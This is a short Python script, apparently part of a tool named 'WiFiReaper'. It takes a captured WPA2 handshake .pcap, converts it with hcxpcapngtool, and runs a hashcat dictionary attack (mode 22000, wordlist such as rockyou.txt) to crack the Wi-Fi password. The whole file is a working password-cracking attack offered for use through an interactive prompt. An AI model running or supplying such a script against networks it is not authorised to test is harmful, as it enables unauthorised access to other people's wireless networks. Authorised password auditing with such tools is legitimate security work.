import subprocess
import os

def crack_with_hashcat(pcap_file, wordlist, use_optimized=False):
    """
    Converts a .pcap file to .hccapx and runs Hashcat to crack the WPA2 key.
    """
    if not os.path.exists(pcap_file):
        print(f"[-] Handshake file not found: {pcap_file}")
        return

    if not os.path.exists(wordlist):
        print(f"[-] Wordlist file not found: {wordlist}")
        return

    hccapx_file = pcap_file.replace(".pcap", ".hccapx")

    print(f"[+] Converting .pcap to .hccapx using hcxpcapngtool...")
    convert_result = subprocess.run(["hcxpcapngtool", "-o", hccapx_file, pcap_file], capture_output=True, text=True)

    if convert_result.returncode != 0 or not os.path.exists(hccapx_file):
        print(f"[-] Failed to convert file. Details:\n{convert_result.stderr}")
        return

    print(f"[✔] Conversion successful: {hccapx_file}")
    print(f"[+] Starting Hashcat crack...")

    try:
        cmd = [
            "hashcat", "-m", "22000", hccapx_file, wordlist,
            "--force", "--status"
        ]
        if use_optimized:
            cmd.append("-O")

        subprocess.run(cmd)
    except KeyboardInterrupt:
        print("\n[-] Cracking interrupted.")
    except Exception as e:
        print(f"[-] Error: {e}")

# Optional CLI usage
def main():
    print("== WiFiReaper - WPA2 Handshake Cracker (Hashcat) ==")
    pcap_file = input("Enter path to handshake .pcap file: ").strip()
    wordlist = input("Enter path to wordlist (e.g., rockyou.txt): ").strip()
    use_opt = input("Use optimized kernel (-O)? (y/n): ").strip().lower() == "y"
    crack_with_hashcat(pcap_file, wordlist, use_opt)

if __name__ == "__main__":
    main()
